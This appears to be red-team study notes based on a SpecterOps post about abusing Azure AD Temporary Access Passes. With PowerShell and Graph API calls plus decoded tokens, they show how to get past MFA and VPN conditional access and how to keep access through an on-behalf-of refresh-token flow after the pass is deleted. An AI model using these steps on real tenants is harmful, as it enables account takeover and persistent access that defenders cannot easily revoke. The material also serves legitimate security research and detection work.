# Abusing TAP


Source [I'd TAP that Pass by Daniel Heinsen](https://specterops.io/blog/2023/03/29/id-tap-that-pass/)

`Conditional Access Policies (CAP)` will hinder authentication to a user in spite of having high privs. However, this can be bypass by assigning a TAP to a user.

- This will not invalidate their existing password
- It will satisfy strong MFA requirements. Therefore, we can use this password directly without needing a second factor like an application code or SMS

Two permissions required for configuring TAP for a user:

1. `Authentication Policy Administrator` **OR**
2. `Policy.ReadWrite.AuthenticationMethod`

## Scenario 1

In the first scenario, attacker has agent on `User A's` workstation. Therefore, they can perform actions as User A on AzureAD.

Now the attacker is trying to authenticate as User B. There are 2 CAPs applied:

1. Users can only authenticate from the Target VPN
2. MFA is required

- The first CAP can be satisfied by authenticating through User A's workstations since its inside the VPN
- However, the second MFA cannot be satisfied even if attacker changes User B's password
  - Also changing password is noisy

- In this case we can configure a TAP for the User B

### Using AAD Credentials to Test Authentication

- First login will be with no MFA and normal password in an unauthenticated context.

```powershell
# Unauthenticated context
$token = Get-AADIntAccessTokenForMSGraph -Credentials $cred
Parse-JWTtoken $token

aud                 : https://graph.microsoft.com
iss                 : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
...
acct                : 0
acr                 : 1
aio                 : E2ZgYE...
amr                 : {pwd}
app_displayname     : Azure Active Directory PowerShell
appid               : 1b730954-1685-4b74-9bfd-dac224a7b894
appidacr            : 0
family_name         : Test
given_name          : Tap
idtyp               : user
ipaddr              : NON VPN IP
name                : Tap Test
oid                 : 515a273b-5b90-4a4a-9829-94f0dd0c94be
platf               : 3
puid                : 10032002642015C3
rh                  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
scp                 : Agreement.Read.All Agreement.ReadWrite.All AgreementAcceptance.Read AgreementAcceptance.Read.All AuditLog.Read.All
                      Directory.AccessAsUser.All Directory.ReadWrite.All Group.ReadWrite.All IdentityProvider.ReadWrite.All
                      Policy.ReadWrite.TrustFramework PrivilegedAccess.ReadWrite.AzureAD PrivilegedAccess.ReadWrite.AzureADGroup
                      PrivilegedAccess.ReadWrite.AzureResources TrustFrameworkKeySet.ReadWrite.All User.Invite.All
sub                 : ZQXXmiLnmQ3xlPE05fjYrbfNTsdiScflK7VkBtDacPw
tenant_region_scope : NA
tid                 : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
unique_name         : taptest@specterdev.onmicrosoft.com
upn                 : taptest@specterdev.onmicrosoft.com
```

- There is a `pwd` value in the `amr` claim.
    - This indicates that the access token was obtained with a standard password and has not been authenticated with another factor.
    - We will add 2 CAPs to simulate the above given scenario to test our TAP

- First will be the MFA requirement
- Second will be the requirement to authenticate from inside a VPN

Now when we authenticate we will get an error:

```powershell
# Unauthenticated context
$token = Get-AADIntAccessTokenForAADGraph -Credentials $cred -SaveToCache
AADSTS50079: Due to a configuration change made by your administrator, or because you moved to a new location, you must enroll in multi-factor
authentication to access '0000000-0000-0000-c000-000000000000'.
```

This shows that the CAP is working as intended. 

- To bypass this we will use the following code
- We need to execute the API call in context of `User A`
    - For this we will use the bearer token of `User A` in the `$header`
    - The audience for this will be graph explorer application.

```powershell
# Context of User A
$body

Name                           Value
----                           -----
isUsableOnce                   False
lifetimeInMinutes              60


Invoke-WebRequest -Headers $headers -Method POST -Body $body https://graph.microsoft.com/v1.0/users/<user id>/authentication/temporaryAccessPassMethods
```

- This will give the TAP password of the `User B`

#### Authenticating Using the TAP

- Using the TAP we will again try to attempt authentication

```powershell
# Unauthenticated context
$token = Get-AADIntAccessTokenForMSGraph
# Enter TAP when prompted
Parse-JWTToken $token

...

aud                 : https://graph.microsoft.com
iss                 : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
iat                 : 1673623990
nbf                 : 1673623990
exp                 : 1673629641
acct                : 0
acr                 : 1
aio                 : AVQAq/8TAAAAp9gPKmzkTM8e6LBhxhAC0hoAsnfilVm/xqghwbSjhtKh7Yi06Z80CYI0Z9KSO4hZ2Bi0yeJwm9h
                      A49OPf/hyo+S/DuLboO6LtnXCX27lB+Y=
amr                 : {tap, mfa}
app_displayname     : Azure Active Directory PowerShell
appid               : 1b730954-1685-4b74-9bfd-dac224a7b894
appidacr            : 0
family_name         : Test
given_name          : Tap
idtyp               : user
ipaddr              : NON VPN IP
name                : Tap Test
oid                 : 515a273b-5b90-4a4a-9829-94f0dd0c94be
platf               : 3
puid                : 10032002642015C3
rh                  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
scp                 : Agreement.Read.All Agreement.ReadWrite.All AgreementAcceptance.Read
                      AgreementAcceptance.Read.All AuditLog.Read.All Directory.AccessAsUser.All
                      Directory.ReadWrite.All Group.ReadWrite.All IdentityProvider.ReadWrite.All
                      Policy.ReadWrite.TrustFramework PrivilegedAccess.ReadWrite.AzureAD
                      PrivilegedAccess.ReadWrite.AzureADGroup PrivilegedAccess.ReadWrite.AzureResources
                      TrustFrameworkKeySet.ReadWrite.All User.Invite.All
sub                 : ZQXXmiLnmQ3xlPE05fjYrbfNTsdiScflK7VkBtDacPw
tenant_region_scope : NA
tid                 : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
unique_name         : taptest@specterdev.onmicrosoft.com
upn                 : taptest@specterdev.onmicrosoft.com
...
```

- The token contains the `mfa` value in the `amr` claim
    - This indicates that your TAP counts as `strong authentication` and the CAP that requires MFA will be satisfied **(Except Passwordless and Phishing Resistant strengths)**


### Authenticating another OAuth Client Using TAP

- The original intent of TAP is to register passwordless authentication
- However, we can also authenticate with any other OAuth client, like AzureAD PowerShell module


```powershell
# Unauthenticated context
Get-AADIntAccessTokenForMSGraph -SaveToCache
```

- This will give us a refresh token which we can obtain access tokens for other clients with the same `Family of Client ID's (FOCI)`
- However, the Refresh token is will expire when the TAP expires, which is eight hours

- Therefore, we can request new access tokens with our refresh token for up to 8 hours.
    - But we need access after the TAP has expired


## On-Behalf-of (OBO) Persistence

- First we register a new Azure AD application.
- This can be from a different tenant also, but its better it being from the same tenant because Microsoft will block it as a risky application
- This application will act as "middleware" in our `on-behalf-of` flow
    - We need to create a new application, so that we can use the client secret to obtain the intermediary token from the middleware API to use with the back-end API (Microsoft Graph)
- The back-end token will be washed of the TAP value in the `amr` claim and will last longer than the TAP.

1. First create middleware application
    - Create a client secret and save it
    - We expose an API and give the application API permissions that don't require Admin consent

2. Now we will be acting in context of the middleware application. 
    - To simulate an on-behalf-of authentication flow, we need an access token for the user whose TAP we have configured (`User B`)
    - We need the consent to the Graph API permissions.
    - Using the device code flow and a browser will take you through the appropriate consent flow


```powershell
$middleware_token = Get-AADIntAccessToken -ClientId <Client ID of middleware app> -Resource <Client ID of middleware app> -UseDeviceCode
```

3. Now parse the returned JWT and see that it is still marked as `mfa, tap` for the `amr` section

```
aud         : 1efbd471-3de4-476a-8afd-b3203ce16a91
iss         : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
...
acr         : 1
aio         : AVQAq/8TAAAAMwsRobmyfwGdg6LN9iOtjgJziEQp7RkHGGcnKFpDaUsgDO3vZ5dxehhmRsyUb0lCcxvVRYqCvK+pO4dFn9ZNBhl9eBxVm0umDT9iAGe8KzA=
amr         : {tap, mfa}
appid       : 1efbd471-3de4-476a-8afd-b3203ce16a91
appidacr    : 0
family_name : Test
given_name  : Tap
ipaddr      : VPN IP
name        : Tap Test
oid         : 515a273b-5b90-4a4a-9829-94f0dd0c94be
rh          : 0.AVEAsLASbMyyc0qCUguUv8ohRXHU-x7kPWpHiv2zIDzhapFRAL8.
scp         : Acronym.Read.All AppCatalog.Read.All AppCatalog.Submit AttackSimulation.ReadWrite.All Bookings.Manage.All Bookings.Read.All Bookings.ReadWrite.All BookingsAppointment.ReadWrite.All
              Calendars.Read Calendars.Read.Shared Calendars.ReadBasic Calendars.ReadWrite Calendars.ReadWrite.Shared Channel.ReadBasic.All ChannelMessage.Edit ChannelMessage.Send Chat.Create Chat.Read
              Chat.ReadBasic Chat.ReadWrite ChatMessage.Read ChatMessage.Send CloudPC.Read.All Contacts.Read Contacts.Read.Shared Contacts.ReadWrite Contacts.ReadWrite.Shared Device.Command Device.Read
              DigitalHealthSettings.Read EAS.AccessAsUser.All email EntitlementMgmt-SubjectAccess.ReadWrite EWS.AccessAsUser.All Family.Read Files.Read Files.Read.All Files.Read.Selected Files.ReadWrite
              Files.ReadWrite.All Files.ReadWrite.AppFolder Files.ReadWrite.Selected Financials.ReadWrite.All IMAP.AccessAsUser.All IndustryData.ReadBasic.All InformationProtectionPolicy.Read Mail.Read
              Mail.Read.Shared Mail.ReadBasic Mail.ReadBasic.Shared Mail.ReadWrite Mail.ReadWrite.Shared Mail.Send Mail.Send.Shared MailboxSettings.Read MailboxSettings.ReadWrite
              NetworkAccessBranch.Read.All NetworkAccessPolicy.Read.All Notes.Create Notes.Read Notes.Read.All Notes.ReadWrite Notes.ReadWrite.All Notes.ReadWrite.CreatedByApp
              Notifications.ReadWrite.CreatedByApp offline_access OnlineMeetingArtifact.Read.All OnlineMeetings.Read OnlineMeetings.ReadWrite openid People.Read Policy.Read.ConditionalAccess
              POP.AccessAsUser.All Presence.Read Presence.Read.All Presence.ReadWrite PrinterShare.Read.All PrinterShare.ReadBasic.All PrintJob.Create PrintJob.Read PrintJob.ReadBasic PrintJob.ReadWrite
              PrintJob.ReadWriteBasic profile QnA.Read.All ShortNotes.Read ShortNotes.ReadWrite Sites.Manage.All Sites.Read.All Sites.ReadWrite.All SMTP.Send Tasks.Read Tasks.Read.Shared Tasks.ReadWrite
              Tasks.ReadWrite.Shared Team.Create Team.ReadBasic.All TeamsActivity.Read TeamsActivity.Send TeamsAppInstallation.ReadForChat TeamsAppInstallation.ReadForUser TeamsTab.ReadWriteForUser
              TeamsTab.ReadWriteSelfForUser TeamTemplates.Read TeamworkAppSettings.Read.All ThreatSubmission.Read ThreatSubmission.ReadWrite User.Read User.ReadBasic.All User.ReadWrite
              UserActivity.ReadWrite.CreatedByApp UserNotification.ReadWrite.CreatedByApp UserTimelineActivity.Write.CreatedByApp
sub         : bfWWve9KN8ykFqvsAVI-53rZ501f68Gd9wGBz4eewO0
tid         : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
unique_name : taptest@specterdev.onmicrosoft.com
upn        : taptest@specterdev.onmicrosoft.com
...
```

This is expected, but we need to use it in an on-behalf-of flow to obtain a back-end token.
This will not have the TAP mention and will not have the usual expiry of the TAP

4. Our payload needs to `requested_token_use` field set to `on_behalf_of`
    - We will follow the documentation steps, but replace the `client_id`, `client_secret` and `assertion` with appropriate values
    - We also set the to scope to `https://graph.microsoft.com/.default offline_access` to get all the API permissions we can and request refresh token
    
```powershell
$backend_resp = Invoke-WebRequest -Method POST -Headers $headers -Body $obo_body https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token
```

Now dump the returned JWT and check if the token as scrubbed of the TAP

```powershell
$access_token = ($backend_resp | ConvertFrom-Json).access_token


aud                 : https://graph.microsoft.com
iss                 : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
..
acct                : 0
acr                 : 1
aio                 : AVQAq/8TAAAAJE4cMHAttKvlihhqlj/7AJU6M9r0vPERUJ6dkjOez/z0Y/ywiAGc2e8nMv6Ev6BWhj2kie9fdA4i1OVxvhkNFT49kR6xM5lgwxVNni+XMPo=
amr                 : {tap, mfa}
app_displayname     : obo-test
appid               : 1efbd471-3de4-476a-8afd-b3203ce16a91
appidacr            : 1
family_name         : Test
given_name          : Tap
idtyp               : user
ipaddr              : VPN IP
name                : Tap Test
oid                 : 515a273b-5b90-4a4a-9829-94f0dd0c94be
platf               : 3
puid                : 10032002642015C3
rh                  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
scp                 : Acronym.Read.All AppCatalog.Read.All AppCatalog.Submit AttackSimulation.ReadWrite.All Bookings.Manage.All Bookings.Read.All Bookings.ReadWrite.All BookingsAppointment.ReadWrite.All Calendars.Read Calendars.Read.Shared Calendars.ReadBasic Calendars.ReadWrite
                      Calendars.ReadWrite.Shared Channel.ReadBasic.All ChannelMessage.Edit ChannelMessage.Send Chat.Create Chat.Read Chat.ReadBasic Chat.ReadWrite ChatMessage.Read ChatMessage.Send CloudPC.Read.All Contacts.Read Contacts.Read.Shared Contacts.ReadWrite
                      Contacts.ReadWrite.Shared Device.Command Device.Read DigitalHealthSettings.Read EAS.AccessAsUser.All email EntitlementMgmt-SubjectAccess.ReadWrite EWS.AccessAsUser.All Family.Read Files.Read Files.Read.All Files.Read.Selected Files.ReadWrite Files.ReadWrite.All
                      Files.ReadWrite.AppFolder Files.ReadWrite.Selected Financials.ReadWrite.All IMAP.AccessAsUser.All IndustryData.ReadBasic.All InformationProtectionPolicy.Read Mail.Read Mail.Read.Shared Mail.ReadBasic Mail.ReadBasic.Shared Mail.ReadWrite Mail.ReadWrite.Shared Mail.Send
                      Mail.Send.Shared MailboxSettings.Read MailboxSettings.ReadWrite NetworkAccessBranch.Read.All NetworkAccessPolicy.Read.All Notes.Create Notes.Read Notes.Read.All Notes.ReadWrite Notes.ReadWrite.All Notes.ReadWrite.CreatedByApp Notifications.ReadWrite.CreatedByApp
                      OnlineMeetingArtifact.Read.All OnlineMeetings.Read OnlineMeetings.ReadWrite openid People.Read Policy.Read.ConditionalAccess POP.AccessAsUser.All Presence.Read Presence.Read.All Presence.ReadWrite PrinterShare.Read.All PrinterShare.ReadBasic.All PrintJob.Create
                      PrintJob.Read PrintJob.ReadBasic PrintJob.ReadWrite PrintJob.ReadWriteBasic profile QnA.Read.All ShortNotes.Read ShortNotes.ReadWrite Sites.Manage.All Sites.Read.All Sites.ReadWrite.All SMTP.Send Tasks.Read Tasks.Read.Shared Tasks.ReadWrite Tasks.ReadWrite.Shared
                      Team.Create Team.ReadBasic.All TeamsActivity.Read TeamsActivity.Send TeamsAppInstallation.ReadForChat TeamsAppInstallation.ReadForUser TeamsTab.ReadWriteForUser TeamsTab.ReadWriteSelfForUser TeamTemplates.Read TeamworkAppSettings.Read.All ThreatSubmission.Read
                      ThreatSubmission.ReadWrite User.Read User.ReadBasic.All User.ReadWrite UserActivity.ReadWrite.CreatedByApp UserNotification.ReadWrite.CreatedByApp UserTimelineActivity.Write.CreatedByApp
signin_state        : {inknownntwk}
sub                 : ZQXXmiLnmQ3xlPE05fjYrbfNTsdiScflK7VkBtDacPw
tenant_region_scope : NA
unique_name         : taptest@specterdev.onmicrosoft.com
upn                 : taptest@specterdev.onmicrosoft.com
uti                 : K7kDU4zVLE6MBg0sVgrgAA
ver                 : 1.0
...
```

We see that the `amr` section still has `tap` mentioned. 


### Reusing the Refresh Token from OBO Request

```powershell

$eternal_payload['client_id'] = "1efbd471-3de4-476a-8afd-b3203ce16a91"
$eternal_payload['refresh_token'] = ($backend_resp | ConvertFrom-Json).refresh_token
$eternal_payload['client_secret'] = $client_secret
$eternal_payload['scope'] = "https://graph.microsoft.com/.default offline_access"
$eternal_payload['grant_type'] = "refresh_token"
$free_token = Invoke-WebRequest -Method POST -Headers $headers -Body $eternal_payload $url
Parse-JWTToken ($free_token.Content | ConvertFrom-Json).access_token
```

```powershell
...


aud                 : https://graph.microsoft.com
iss                 : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
...
acct                : 0
acr                 : 1
aio                 : AVQAq/8TAAAABsyEopLkAOdklTxbv3h7U8++NT6g/NPdM4mtftVdbo7UJgTR0tvwTWTqT8SsQn9K1wB3KUQey2lMTdNI5qR6Yf/Kl+cmNSV0gHFJvybciqA=
amr                 : {tap, mfa}
app_displayname     : obo-test
appid               : 1efbd471-3de4-476a-8afd-b3203ce16a91
appidacr            : 1
family_name         : Test
given_name          : Tap
idtyp               : user
ipaddr              : < REDACTED VPN IP >
name                : Tap Test
oid                 : 515a273b-5b90-4a4a-9829-94f0dd0c94be
platf               : 3
puid                : 10032002642015C3
rh                  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
scp                 : Acronym.Read.All AppCatalog.Read.All AppCatalog.Submit AttackSimulation.ReadWrite.All Bookings.Manage.All Bookings.Read.All Bookings.ReadWrite.All BookingsAppointment.ReadWrite.All Calendars.Read Calendars.Read.Shared Calendars.ReadBasic Calendars.ReadWrite
                      Calendars.ReadWrite.Shared Channel.ReadBasic.All ChannelMessage.Edit ChannelMessage.Send Chat.Create Chat.Read Chat.ReadBasic Chat.ReadWrite ChatMessage.Read ChatMessage.Send CloudPC.Read.All Contacts.Read Contacts.Read.Shared Contacts.ReadWrite
                      Contacts.ReadWrite.Shared Device.Command Device.Read DigitalHealthSettings.Read EAS.AccessAsUser.All email EntitlementMgmt-SubjectAccess.ReadWrite EWS.AccessAsUser.All Family.Read Files.Read Files.Read.All Files.Read.Selected Files.ReadWrite Files.ReadWrite.All
                      Files.ReadWrite.AppFolder Files.ReadWrite.Selected Financials.ReadWrite.All IMAP.AccessAsUser.All IndustryData.ReadBasic.All InformationProtectionPolicy.Read Mail.Read Mail.Read.Shared Mail.ReadBasic Mail.ReadBasic.Shared Mail.ReadWrite Mail.ReadWrite.Shared Mail.Send
                      Mail.Send.Shared MailboxSettings.Read MailboxSettings.ReadWrite NetworkAccessBranch.Read.All NetworkAccessPolicy.Read.All Notes.Create Notes.Read Notes.Read.All Notes.ReadWrite Notes.ReadWrite.All Notes.ReadWrite.CreatedByApp Notifications.ReadWrite.CreatedByApp
                      OnlineMeetingArtifact.Read.All OnlineMeetings.Read OnlineMeetings.ReadWrite openid People.Read Policy.Read.ConditionalAccess POP.AccessAsUser.All Presence.Read Presence.Read.All Presence.ReadWrite PrinterShare.Read.All PrinterShare.ReadBasic.All PrintJob.Create
                      PrintJob.Read PrintJob.ReadBasic PrintJob.ReadWrite PrintJob.ReadWriteBasic profile QnA.Read.All ShortNotes.Read ShortNotes.ReadWrite Sites.Manage.All Sites.Read.All Sites.ReadWrite.All SMTP.Send Tasks.Read Tasks.Read.Shared Tasks.ReadWrite Tasks.ReadWrite.Shared
                      Team.Create Team.ReadBasic.All TeamsActivity.Read TeamsActivity.Send TeamsAppInstallation.ReadForChat TeamsAppInstallation.ReadForUser TeamsTab.ReadWriteForUser TeamsTab.ReadWriteSelfForUser TeamTemplates.Read TeamworkAppSettings.Read.All ThreatSubmission.Read
                      ThreatSubmission.ReadWrite User.Read User.ReadBasic.All User.ReadWrite UserActivity.ReadWrite.CreatedByApp UserNotification.ReadWrite.CreatedByApp UserTimelineActivity.Write.CreatedByApp
signin_state        : {inknownntwk}
sub                 : ZQXXmiLnmQ3xlPE05fjYrbfNTsdiScflK7VkBtDacPw
tenant_region_scope : NA
tid                 : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
unique_name         : taptest@specterdev.onmicrosoft.com
upn                 : taptest@specterdev.onmicrosoft.com
uti                 : cR9hIrrW5kSxj1GsFmW2AQ
ver                 : 1.0
...
```

We still get an access token from a refresh token obtained from a TAP that was deleted

- Even if the TAP is deleted, attacker can still maintain access to the user account
- Using OBO authentication flow, the correlation between the TAP and Refresh token was removed
